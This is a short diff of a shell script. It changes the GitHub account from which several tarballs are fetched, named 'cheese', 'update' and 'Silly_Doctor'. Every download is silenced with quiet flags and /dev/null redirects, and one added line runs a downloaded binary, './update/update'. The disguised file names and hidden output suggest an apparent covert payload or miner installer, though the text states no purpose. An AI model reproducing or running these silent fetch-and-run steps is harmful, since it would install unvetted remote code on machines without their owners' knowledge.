@@ -15,7 +15,7 @@ dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
 sleep 2
 
-wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/cheese.tar.gz > /dev/null
+wget -q https://raw.githubusercontent.com/velilemaqolombeni/update/main/cheese.tar.gz > /dev/null
 
 sleep 2
 
@@ -80,7 +80,7 @@ ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
 
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null
+curl -s -L -o update.tar.gz https://raw.githubusercontent.com/velilemaqolombeni/update/main/update.tar.gz > /dev/null
 
 sleep 2
 
@@ -110,7 +110,7 @@ sleep 2
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Silly_Doctor.tar.gz 1>/dev/null 2>&1
+./update/update wget -q https://raw.githubusercontent.com/velilemaqolombeni/update/main/Silly_Doctor.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
